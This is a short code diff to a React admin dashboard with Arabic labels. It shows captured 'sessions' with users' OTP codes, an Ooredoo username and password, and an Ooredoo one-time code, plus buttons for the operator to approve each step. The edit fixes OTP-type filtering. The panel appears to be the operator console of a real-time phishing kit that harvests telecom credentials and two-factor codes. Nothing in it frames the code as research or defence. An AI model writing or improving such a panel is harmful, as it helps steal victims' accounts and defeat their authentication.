@@ -328,7 +328,7 @@ export default function AdminDashboard() {
                   title="رموز التحقق (OTP)"
                   icon={<Key className="w-4 h-4" />}
                   data={selectedSession.otps?.reduce((acc: any, otp: any, i: number) => {
-                    if (otp.otpType !== 'ooredoo') acc[`رمز ${i + 1}`] = otp.otpCode;
+                    if (otp.otpType !== 'ooredoo' && otp.otpType !== 'ooredoo_otp') acc[`رمز ${i + 1}`] = otp.otpCode;
                     return acc;
                   }, {}) || { "رمز OTP": "—" }}
                   currentStep={selectedSession.currentStep}
@@ -351,7 +351,7 @@ export default function AdminDashboard() {
                   data={{
                     "المستخدم": selectedSession.ooredoo?.ooredooUser,
                     "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
-                    "OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo')?.otpCode || '—',
+                    "OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo_otp')?.otpCode || '—',
                   }}
                   currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
